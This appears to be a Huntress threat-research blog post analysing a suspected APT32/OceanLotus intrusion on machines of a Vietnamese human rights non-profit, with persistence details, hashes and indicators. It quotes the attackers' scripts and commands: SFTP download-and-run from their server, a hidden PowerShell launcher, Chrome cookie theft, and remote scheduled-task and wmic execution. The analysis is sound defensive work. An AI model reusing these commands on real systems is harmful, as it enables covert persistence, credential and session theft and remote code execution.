@@ -1,0 +1,1778 @@
+﻿2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Home Blog Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders
+
+August 28, 2024
+
+Advanced Persistent Threat
+Targeting Vietnamese Human Rights
+Defenders
+By: Jai Minton Craig Sweeney
+
+Executive Summary
+It doesn’t matter if you’re a small organization, a non-profit, or a Fortune 500 company, there’s always someone who will
+want access to your information. In many instances, this access is primarily for financial gain; however, for many non-profits
+and small organizations the harsh reality is that the nature of their work, or their clients, also makes them an ideal target for
+intelligence gathering and espionage-motivated threat actors. 
+
+Threat hunters at Huntress recently discovered an intrusion on a Vietnamese human rights defender’s machine which is
+suspected to have been ongoing for at least four years. This intrusion has a number of overlaps with known techniques used
+by the threat actor APT32/OceanLotus, and a known target demographic which aligns with APT32/OceanLotus targets. This
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 1/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+post highlights just how far advanced threats will go for information gathering purposes when it aligns with their strategic
+interests.
+
+Background
+Huntress regularly performs threat hunting operations to find intrusions that may have slipped past normal security defenses.
+In a recent case, Huntress analysts identified an intrusion against a non-profit supporting Vietnamese human rights which has
+likely spanned the course of at least four years. While detections in the Huntress platform found some anomalous activity
+which was reported to the Huntress partner, the threat hunting team was able to find well-hidden persistence, and actions
+taken by the threat actor. This information was then used to piece the intrusion together and trace it back long before the
+Huntress agent was deployed. 
+
+Hunting Methodology
+Huntress is uniquely positioned to look for threat actors across millions of systems. This comes through the combination of
+process behavior insights and persistent footholds gathered from the Huntress EDR. Leveraging process behavior insights,
+threat hunters use intelligence, or a hypothesis, and their knowledge of what is normal on a system to create threat hunting
+rules. These rules differ from product detections as they are generally higher in frequency, and lower in efficacy given they
+target techniques used by threat actors who are trying to blend into an environment. Using created hunting rules, threat
+hunters often take three different approaches to threat hunting including looking for: rare hunting signals, multiple signal
+clusters, and statistical anomalies.
+
+The Huntress Managed EDR consistently identifies persistent footholds on a system. This allows threat hunters to locate
+anomalies where a persistent foothold may be found on a small subset of the systems protected by Huntress. These anomalies
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 2/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+could be a difference in persistence mechanism, name, binary, or another attribute to what is normally seen across other
+Huntress partner environments. Whilst investigating a new hunting signal, it was found that a system would infrequently and
+inconsistently run a small number of administrative commands from an unusual process. 
+
+The admin commands run were deliberate and rarely exceeded three commands in a ten minute period, with a max of twelve
+being run on a system during any given day. Despite this, the unusual activity was enough to raise the attention of Huntress
+threat hunters who proceeded to look over persistent footholds in the partner environment and piece together the larger
+scale of this intrusion.
+
+Investigation and Analysis
+Host 1
+Persistence Mechanisms
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 3/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 1: Diagram of Persistence Mechanisms on host 1
+
+While onboarding to Huntress, host 1 presented with a scheduled task titled Adobe Flash Updater:
+
+Scheduled Task 1
+Task Path: Adobe Flash Updater
+Executable: c:\windows\system32\wscript.exe
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 4/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Arguments: /Nologo /E:VBScript
+C:\ProgramData\AppData\Roaming\Adobe\Updater\scheduler\scheduler.ps1:log.txt
+
+The referenced scheduler.ps1:log.txt, is an alternate data stream named log.txt within a file named scheduler.ps1.
+This file was already removed prior to the Huntress agent being deployed; however, the naming convention and use of an
+alternate data stream has some overlap with public reporting by Cybereason detailing a VBS and PowerShell-based loader
+used to load Metasploit and Cobalt Strike payloads.
+
+In the following weeks, new scheduled tasks were created on the host and identified by the Huntress agent roughly 10 days
+apart:
+
+Scheduled Task 2
+Task Path: AdobeUpdateTaskUser<SID>
+Executable: C:\Users\<REDACTED>\AppData\Roaming\Java\bin\javaw.exe
+Arguments: -jar C:\Users\<REDACTED>\AppData\Roaming\Adobe\Acrobat\adobe.jar mi54giwp
+
+This scheduled task referenced a malicious Java Archive (JAR) file which was specifically created for the user and system in
+question. The malware contained a hard-coded reference to a file C:\Users\
+<REDACTED>\Appdata\Roaming\Adobe\Acrobat\adobe.png which contained potentially encrypted shellcode or
+configuration that was to be loaded by an embedded DLL within the Java Archive named mi54giwp.dll. The above
+scheduled task was subsequently interactively launched by the threat actor using the native Windows schtasks.exe
+executable:
+
+schtasks /run /TN "AdobeUpdateTaskUser<SID>"
+
+Scheduled Task 3
+Task Path: WinDefenderAntivirusUpdateTaskUser<SID2>Core
+Executable: wscript
+Arguments: C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Windows\CloudStore\MSSharePoint.vbs
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 5/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+This scheduled task contained a different user SID than the one found in the AdobeUpdateTaskUser scheduled task. The
+MSSharePoint.vbs script was designed to use a private key already placed on disk, authenticate to a remote SFTP server,
+and download / run a script called cloud.bat.
+
+1 C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Windows\CloudStore\sftp.exe
+2  -P 6291 -o StrictHostKeyChecking=no -i C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Windows\CloudS
+3  MSSHAREUTHVBA@base.msteamsapi.com:/MSSHAREUTHVBA/cloud.bat C:\Users\<REDACTED>\AppData\Roaming\Mi
+
+MSSharePoint.vbs hosted with ❤ by GitHub view raw
+
+The cloud.bat file used the same private key to authenticate to the same remote SFTP server, and pulled down a file called
+cloudlog.txt.
+
+1 @echo off
+2 set user=MSSHAREUTHVBA
+3 set destination_folder=%AppData%\Microsoft\Windows\CloudStore\
+4 set sftpath=sftp.exe
+5 set vbs=%destination_folder%MSSharePoint.vbs
+6
+
+7
+
+8 if exist "%windir%\System32\OpenSSH\sftp.exe" (
+9 goto upload
+10) else (
+11 set sftpath=%destination_folder%%sftpath%
+12 goto upload
+13)
+
+14
+
+15: upload
+16%sftpath% -P 6291 -o StrictHostKeyChecking=no -i %destination_folder%id_rsa %user%@base.msteamsapi.com:/%user%/cloudlog.t
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 6/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+cloud.bat hosted with ❤ by GitHub view raw
+
+At the time of investigation there was no cloudlog.txt file on disk. Modification timestamps on the private key, SFTP, and
+SSH binaries all indicate that they were possibly present since November 2023.
+
+Less than a day later, schtasks.exe was used to create persistence that would run cloud.bat once every 5 hours.
+
+schtasks /create /sc minute /mo 300 /tn
+Handler{60396-307392-03497-03790-3702046} /tr
+"C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Windows\CloudStore\cloud.bat" /f
+
+Scheduled Task 4
+Task Path: Handler{60396-307392-03497-03790-3702046}
+Executable: C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Windows\CloudStore\cloud.bat
+
+Creation of the Handler scheduled task was later found to have originated from a DllHost surrogate process which was
+executing a DLL from a COM object stored in the registry with the identifier {1F7CFAF8-B558-4EBD-9526-203135A79B1D}.
+
+Parent Process: C:\WINDOWS\SysWOW64\DllHost.exe /Processid:{1F7CFAF8-B558-4EBD-9526-203135A79B1D}
+
+Process: cmd /c schtasks /create /sc minute /mo 300 /tn
+Handler{60396-307392-03497-03790-3702046} /tr
+"%AppData%\Microsoft\Windows\CloudStore\cloud.bat" /f
+
+It was found that this process was being launched from another scheduled task that was previously setup prior to Huntress
+deployment.
+
+Scheduled Task 5
+Task Path: UpdateLibrary_{1F7CFAF8-B558-4EBD-9526-203135A79B1D}
+Description: This task updates the cached list of folders and the security permissions on any new files in a user’s shared media
+library.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 7/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+COM Handler: {1F7CFAF8-B558-4EBD-9526-203135A79B1D}
+Task File Creation Date: 2020-06-04
+
+This task attempted to masquerade as the legitimate UpdateLibrary task on the system and had an identical description to
+the legitimate UpdateLibrary scheduled task also on the system. The task creation and modification timestamps indicate it
+was first set up in June of 2020. The StartBoundary within the XML file used for this Scheduled Task also had a timestamp
+value of 2020-01-01T00:00:00 indicating that the task was expected to be run from the start of 2020 onwards.
+
+Although the scheduled task didn’t have an executable set to run, it did have a COM Handler that was to be invoked. Analysis
+of the host found a COM object setup using registry keys.
+
+COM Object
+Purpose: Specify that DllHost.exe would run as the surrogate process for a given application
+Registry Key: HKU\<SID>\Software\Classes\AppID\{1F7CFAF8-B558-4EBD-9526-203135A79B1D}.
+Registry Entry Value: DllSurrogate
+Registry Entry Data: 0
+Purpose: Correlate application identifier with its COM object identifier
+Registry Key: HKU\<SID>\Software\Classes\WOW6432Node\CLSID\{1F7CFAF8-B558-4EBD-9526-203135A79B1D}
+Registry Entry Value: AppID
+Registry Entry Data: {1F7CFAF8-B558-4EBD-9526-203135A79B1D}
+
+Purpose: Specify the server DLL to be executed by the COM object identifier
+Registry Key: HKU\<SID>\Software\Classes\WOW6432Node\CLSID\{1F7CFAF8-B558-4EBD-9526-
+203135A79B1D}\InProcServer32
+Registry Entry Value: (Default)
+Registry Entry Data: C:\Users\<REDACTED>\AppData\Roaming\Microsoft\UpdateLibrary\{1F7CFAF8-B558-4EBD-
+9526-203135A79B1D}\cachuri.dll
+
+This COM object DLL set to run was a signed, legitimate iisutil.dll used by IIS Express, which happened to match a rule
+created by Florian Roth from Nextron systems 5 years ago called APT_OceanLotus_ISSUTIL_Sep18. Although this match
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 8/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+was a false positive, a malicious sample was found on VirusTotal matching this rule, which was submitted with the names
+iisutil.dll and iisutil2.dll.
+
+This sample has been flagged by some AV engines as being tied to APT32/OceanLotus and has significant overlap with
+another DLL found on disk called iisutil2.dll. Further analysis of the DLL and 2 other files, which together act as a
+backdoor, are presented in the section: "Analysis of Malware."
+
+Figure 2: Classification of OceanLotus on VirusTotal
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 9/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+A few weeks following the creation of these scheduled tasks, an enumeration command was observed on the host looking for
+current user’s privileges. ‍
+
+whoami /priv
+
+The next day, a forced restart was performed on a remote host. This same action was performed on another system roughly
+two weeks following execution on the first.
+
+cmd /c shutdown /r /m \\<remote ip> /t 0 /f
+
+We don’t know the intent of this action, but speculate it may have been to ensure execution of malware on a remote system
+or to ensure any system configuration changes are applied.
+
+Over the next few months, various discovery commands were performed to ensure access to remote workstations from host 1.
+Actions were taken to ensure network connectivity was still active on the host and remote hosts.
+
+net view \\<remote ip> /all
+net use \\<remote ip> /u:"<domain>\<user>" "<password>"
+netstat -ano
+ipconfig /all
+
+A run key was found on host 1 which referenced a McAfee OEM Module binary (mcoemcpy.exe) masquerading as
+WdiServiceHost. A DLL used for sideloading was not found at the time of investigation; however, public reporting by ESET is
+available which states that this executable is vulnerable to loading a malicious DLL named McUtil.dll.
+
+Run Key 1
+Purpose: Launch an executable known to be vulnerable to DLL Sideloading when user logs in
+Registry Key: HKU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 10/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Registry Entry Value: WdiServiceHost
+Registry Entry Data: C:\Users\<REDACTED>\AppData\Roaming\WdiServiceHost_339453944\WdiServiceHost.exe
+
+A second run key was found on host 1 referencing an Apple Software binary (SoftwareUpdate.exe) with a revoked code
+signature. This persistence mechanism was unique across Huntress customers and it’s believed this was used to sideload a
+malicious DLL. The DLL used for sideloading was not found at the time of investigation; however, public reporting by Recorded
+Future is available which states that this executable is vulnerable to loading a malicious DLL named
+SoftwareUpdateFilesLocalized.dll.
+
+Run Key 2
+Purpose: Launch an executable known to be vulnerable to DLL Sideloading when user logs in
+Registry Key: HKU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Registry Entry Value: Apple Software Update Cache
+Registry Entry Data: C:\ProgramData\Apple\Installer Cache\SoftwareUpdate.exe
+
+Yet another run key was found on host 1 referencing a batch script called connection.bat. This had identical functionality to
+MSSharePoint.vbs except it launched PowerShell to run SFTP rather than a VBS script.
+
+Run Key 3
+Purpose: Launch a batch script when user logs in
+Registry Key: HKU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Registry Entry Value: ChromeUptodate
+Registry Entry Data: C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Windows\CloudStore\connection.bat
+1 @echo off 
+2 powershell -WindowStyle Hidden -executionpolicy bypass -Command "Start-Process -WindowStyle Hidden -FilePath sftp.e
+
+connection.bat hosted with ❤ by GitHub view raw
+
+Right before isolation occurred on this system, the threat actor was seen attempting to steal Google Chrome cookies for all
+user profiles on the system from the DllHost COM object backdoor.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 11/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+cmd /c for /f "tokens=*" %G in ('dir /b "%localappdata%\Google\Chrome\User
+ Data\Profile *"') do copy "%localappdata%\Google\Chrome\User
+ Data\%G\Network\Cookies.bak" "%localappdata%\Google\Chrome\User 
+Data\%G\Cookies" /y
+
+Host 2
+Persistence Mechanism
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 12/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 13/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 3: View of Persistence Mechanism on host 2
+
+A separate host, host 2, had remote commands run via Windows Management Instrumentation to execute a batch script
+approximately 1.5 months after the first observed action on host 1. This batch script was used to query processes running on
+the host.
+
+cmd.exe /c C:\Users\Public\Downloads\1.bat
+
+The batch script content is below:
+
+1 wmic process get name, executablepath, sessionid, processid > C:\Users\Public\Downloads\1.txt
+
+1.bat hosted with ❤ by GitHub view raw
+
+Domain Discovery commands were also observed on this system shortly after this.
+
+net group "Domain Admins" /domain
+nltest /dclist:<REDACTED>.local
+
+The process which initiated this was a legitimate version of the calibre eBook management executable calibre.exe which
+had been setup to run as a task. Through Huntress telemetry, it was seen that a Scheduled Task was attempted to be created
+to run this calibre.exe executable from an unusual location.
+
+schtasks /create /sc MINUTE /mo 300 /tn
+ "Microsoft\Windows\WindowsColorSystem\Calibration_Update" /tr
+ "C:\Users\<REDACTED>\AppData\Roaming\Microsoft\SPMigration\Bin\Calibre.exe
+" /f
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 14/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Scheduled Task 1
+Task Path: Microsoft\Windows\WindowsColorSystem\Calibration_Update
+Executable: C:\Users\<REDACTED>\AppData\Roaming\Microsoft\SPMigration\Bin\Calibre.exe
+
+It should be noted that this is an attempt to blend in to the legitimate “Calibration Loader” task generally seen at
+C:\Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader. We speculate that
+the “Calibration Loader” task was chosen because of similar naming as the file calibre.exe.
+
+Soon after this execution there was attempted privilege escalation via named pipes performed through the calibre process.
+This likely involved injection into the legitimate Windows gpupdate.exe process, which is a known process commonly injected
+into through the use of malleable Cobalt Strike profiles and is commonly seen when running the ‘getsystem’ command from
+Cobalt Strike.
+
+Grandparent:
+C:\Users\<REDACTED>\AppData\Roaming\Microsoft\SPMigration\Bin\calibre.exe
+
+Parent:
+C:\windows\sysnative\gpupdate.exe
+
+Process:
+C:\Windows\system32\cmd.exe /c echo a0e3d8a67d0 > \\.\pipe\a64009
+
+Analysis of this host found the calibre executable running a malicious DLL called calibre-launcher.dll on disk; however,
+within a matter of minutes before the DLL and executable could be obtained the threat actor seemed to have killed the
+running process, removed the entire SPMigration directory including the implant. At the time of investigation, there was a
+suspicious entry still in the system DNS cache:
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 15/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+IP DNS Entries
+
+91.231.182[.]18 kpi.msccloudapp[.]com
+
+Although we weren’t able to confirm that this lookup was related to the intrusion in question, the domain was similar to one
+seen previously (msteamsapi[.]com) and the subdomain also had overlap with a subdomain seen on host 4.
+
+Host 3
+Persistence Mechanism
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 16/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 17/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 4: View of Persistence Mechanism on host 3
+
+Shortly after performing named pipe impersonation on host 2, a command was run using the same Cobalt Strike beacon in an
+attempt to create a scheduled task on a third system. This scheduled task was set to run every 15 minutes as the SYSTEM user
+account (Note: the task name resembles a license key and as such has been redacted as a precaution).
+
+schtasks.exe /u "<REDACTED>\<REDACTED>" /p "<REDACTED>" /S
+ <REDACTED> /create /SC MINUTE /MO 15 /TN "<REDACTED>" /TR
+ "C:\Users\<REDACTED>\AppData\Roaming\Microsoft\SPMigration\Bin\calibre.exe" 
+/RU "NT AUTHORITY\SYSTEM" /K /f
+
+Scheduled Task 1
+Task Path: <REDACTED>
+Executable: C:\Users\<REDACTED>\AppData\Roaming\Microsoft\SPMigration\Bin\calibre.exe
+
+Shortly after this, a command was run to invoke the calibre executable.
+
+wmic /node:<REDACTED> /user:<REDACTED> /password:<REDACTED> 
+process call create "cmd.exe /c start
+c:\Users\<REDACTED>\AppData\Roaming\Microsoft\SPMigration\Bin\calibre.exe"
+
+At the time of investigation, the executable and DLL weren’t found on disk.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 18/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Host 4
+Persistence Mechanisms
+
+Figure 5: Diagram of Persistence Mechanisms on host 4
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 19/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Using available Huntress telemetry, a search was run to find any other instances where the calibre executable was set to run
+at startup. Three scheduled tasks were found on the system, two of which were masquerading as legitimate Adobe
+executables, with the other masquerading as a Microsoft update task.
+
+Scheduled Task 1
+Task Path: Adobe Acrobat Update Task
+Executable: C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe
+
+Scheduled Task 2
+Task Path: MicrosoftOne\Uptodate
+Executable: C:\programdata\Microsoft\AppV\ins-findstr.exe
+
+Scheduled Task 3
+Task Path: Adobe Acrobat Update Task_v2
+Executable: C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeUpdate.exe
+
+Analysis of network connections on the system showed that one of the calibre executables posing as Adobe (AdobeARM.exe)
+previously had a network connection to a remote IP address.
+
+IP DNS Entries
+
+51.81.29[.]44 kpi.adcconnect[.]me
+
+Based on analysis of this infrastructure and malicious calibre-loader.dll files submitted to VirusTotal, this IP address and
+the calibre.exe implant were likely tied to a Cobalt Strike Team Server. 
+
+Months after our initial detection on host 1, user privilege discovery was observed via a different calibre.exe process.‍
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 20/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+whoami /priv‍
+
+Weeks following this command we observed a new service created to run a legitimate node executable. This executable was
+set to launch a malicious Node addon binary to evade detection on the system.
+
+Service 1
+Name: Adobe_Reader
+Executable: C:\programdata\adobe\node.exe
+Arguments: -e require('C:\ProgramData\adobe\1lpiozkc.node')
+
+The Node addon was created to specifically target the system and user account and included a hardcoded path to a file on
+disk at C:\Programdata\Adobe\ms-adobe.bin. This also included a hardcoded service name to be created called
+SrvAdobeUpd; however, at the time of investigation, this wasn’t found on the system. Analysis of network connections on the
+system showed that this node executable previously connected to a remote IP address.
+
+IP DNS Entries
+
+5.230.35[.]192 dupleanalytics[.]net
+get.dupbleanalytics[.]net
+
+Based on analysis of this infrastructure and the malicious node file, it’s believed that this was likely tied to a Cobalt Strike Team
+Server.
+
+About a month following the Node addon being launched we observed a scheduled task creation spawning from the
+node.exe process.
+
+Parent Process:
+C:\programdata\adobe\node.exe -e require('C:\\ProgramData\\adobe\\1lpiozkc.node')
+
+Process:
+C:\WINDOWS\system32\cmd.exe /C schtasks /create /sc MINUTE /mo 15 /tn
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 21/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+"96d09a49-98ed-4b12-936a-c8715d2d2c0e" /tr
+"C:\Users\<REDACTED>\Appdata\Roaming\Adobe\bin\javaw.exe -jar
+C:\Users\<REDACTED>\Appdata\Roaming\Adobe\msadobe.jar zfhqq01v" /f
+
+This scheduled task was set to run a jar file which would run an embedded DLL into memory. 
+
+Scheduled Task 4
+Task Name: 96d09a49-98ed-4b12-936a-c8715d2d2c0e
+Executable: C:\Users\<REDACTED>\Appdata\Roaming\Adobe\bin\javaw.exe
+Arguments: -jar C:\Users\<REDACTED>\Appdata\Roaming\Adobe\msadobe.jar zfhqq01v)
+
+Further analysis on msadobe.jar is mentioned in the following section.
+
+Supporting Analysis
+It’s most likely that this is only the tip of the iceberg and that the true extent of this intrusion stretches well beyond systems with
+the Huntress agent. Preliminary analysis was conducted into the malware found on these systems, and infrastructure used in
+the intrusion. This was done as a way of determining any known overlap with threat actor techniques which align with the
+target industry or demographic of the victim organization.
+
+Analysis of Malware
+
+This intrusion had several binaries and files which were involved. A summary of these files are included below.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 22/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Location Hash (SHA256) Notes
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic aa5ff1126a869b8b5a0aa72f609215d
+rosoft\UpdateLibrary\{1F7CFAF8- 8e3b73e833c60e4576f2d3583cc5af Legitimate, signed DLL used by IIS
+B558-4EBD-9526- 4f4 Express to run as a COM object.
+203135A79B1D}\cachuri.dll
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic aa5ff1126a869b8b5a0aa72f609215d
+rosoft\Microsoft Compatibility 8e3b73e833c60e4576f2d3583cc5af Legitimate, signed DLL used by IIS
+Appraiser\{8BCC608C-CE2C-475E- 4f4 Express to run as a COM object.
+85CB-AE0EC95EAC64}\cachuri.dll
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic
+rosoft\AD RMS Rights Policy Template aa5ff1126a869b8b5a0aa72f609215d
+Management (Automated)\ 8e3b73e833c60e4576f2d3583cc5af Legitimate, signed DLL used by IIS
+
+{2A918D97-CCFE-4BE6-AB0E- 4f4 Express to run as a COM object.
+
+D56A2E3F503D}\cachuri.dll
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic
+rosoft\Microsoft Compatibility 09f53e68e55a38c3e989841f59a9c4 Encrypted code loaded by iisutil2.dll.
+Appraiser\{8BCC608C-CE2C-475E- 738c34c308e569d23315fd0e2341195 This decrypts into a DLL which loads
+85CB- 856 code from inside of logo.png.
+AE0EC95EAC64}\iisexpressshim.sdb
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic 09f53e68e55a38c3e989841f59a9c4 Encrypted code loaded by iisutil2.dll.
+rosoft\UpdateLibrary\{1F7CFAF8- 738c34c308e569d23315fd0e2341195 This decrypts into a DLL which loads
+B558-4EBD-9526- 856 code from inside of logo.png.
+203135A79B1D}\iisexpressshim.sdb
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 23/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Location Hash (SHA256) Notes
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic
+rosoft\AD RMS Rights Policy Template a217fe01b34479c71d3a7a524cb3857 Encrypted code loaded by iisutil2.dll.
+Management (Automated)\ 809e575cd223d2dd6666cdd47bd28 This decrypts into a DLL which loads
+{2A918D97-CCFE-4BE6-AB0E- 6cd6 code from inside of logo.png.
+D56A2E3F503D}\iisexpressshim.sdb
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic 47af8a33aac2e70ab6491a4c0a94fd Large file with bloated code
+rosoft\UpdateLibrary\{1F7CFAF8- 7840ff8014ad43b441d01bfaf9bf6c4 appended to it. A malware loader
+B558-4EBD-9526- ab7 which decrypts and loads code from
+203135A79B1D}\iisutil2.dll iisexpressshim.sdb file.
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic 82e94417a4c4a6a0be843ddc60f5e Legitimate PNG file using
+rosoft\UpdateLibrary\{1F7CFAF8- 595733ed99bbfed6ac508a5ac6d4d steganography to hide hidden code
+B558-4EBD-9526- d31813 which is loaded by the decrypted
+203135A79B1D}\logo.png iisexpressshim.sdb file.
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic f8773628cdeb821bd7a1c7235bb855 Legitimate PNG file using
+rosoft\Microsoft Compatibility e9b41aa808fed1510418a7461f7b82fd steganography to hide hidden code
+Appraiser\{8BCC608C-CE2C-475E- 6c which is loaded by the decrypted
+85CB-AE0EC95EAC64}\logo.png iisexpressshim.sdb file.
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic
+rosoft\AD RMS Rights Policy Template aa69c6c22f1931d90032a2d825dbee Legitimate PNG file using
+
+266954fac33f16c6f9ce7714e012404e steganography to hide hidden code
+Management (Automated)\ c1 which is loaded by the decrypted
+{2A918D97-CCFE-4BE6-AB0E- iisexpressshim.sdb file.
+D56A2E3F503D}\logo.png
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 24/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Location Hash (SHA256) Notes
+
+C:\Users\ 735e7b33b97bff3cf6416ed3b8ed721 Legitimate calibre.exe executable
+<REDACTED>\AppData\Roaming\Mic 3d7258eec05202cbf8f8f8002c6435f used to load a likely malicious calibre-
+rosoft\SPMigration\Bin\calibre.exe d1 launcher.dll.
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic File was not present on disk:
+rosoft\SPMigration\Bin\calibre- Unknown Suspected Cobalt Strike beacon
+launcher.dll loader DLL.
+
+C:\Users\ 300ef93872cc574024f2402b5b899c Malicious JAR archive with an
+<REDACTED>\Appdata\Roaming\Ado 834908a0c7da70477a3aeeaee2e45 embedded DLL zfhqq01v.dll that gets
+be\msadobe.jar 8a891 loaded into memory.
+
+Malicious DLL loaded into memory,
+references C:\Users\
+
+6719175208cb6d630cf0307f31e41e0 <REDACTED>\Appdata\Roaming\Ado
+zfhqq01v.dll (inside msadobe.jar) e0308988c57772f25494c9d2a2b84e be\msreader.bin in strings. This runs a
+
+2a1 check to see what directory it is
+running from.
+Appears Timestomped to Nov 11
+23:08:38 2005.
+
+C:\Users\ efc373b0cda3f426d25085938cd02b7 Malicious JAR archive with an
+<REDACTED>\AppData\Roaming\Ado 344098e773037a70404c6028c76cc1 embedded DLL mi54giwp.dll that gets
+be\Acrobat\adobe.jar 6fc loaded into memory
+
+mi54giwp.dll (inside adobe.jar) a79ced63bdf0ea69d84153b926450c Malicious DLL loaded into memory,
+f3119bdea4426476b37dfde2a48a6e references C:\Users\
+de0a <REDACTED>\Appdata\Roaming\Ado
+
+be\Acrobat\adobe.png in strings. This
+runs a check to see what directory it is
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 25/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Location Hash (SHA256) Notes
+
+running from.
+Timestamp of Nov 09 22:47:55 2018
+
+C:\Users\ a6072e7b0fafb5f09fd02c37328091a
+<REDACTED>\AppData\Roaming\Ado bfede86c7c8cb802852985a37147bfa Potentially encrypted shellcode or
+be\Acrobat\adobe.png 19 configuration file.
+
+C:\Users\ File was not present on disk:
+<REDACTED>\Appdata\Roaming\Ado Unknown
+be\msreader.bin Potentially encrypted shellcode or
+
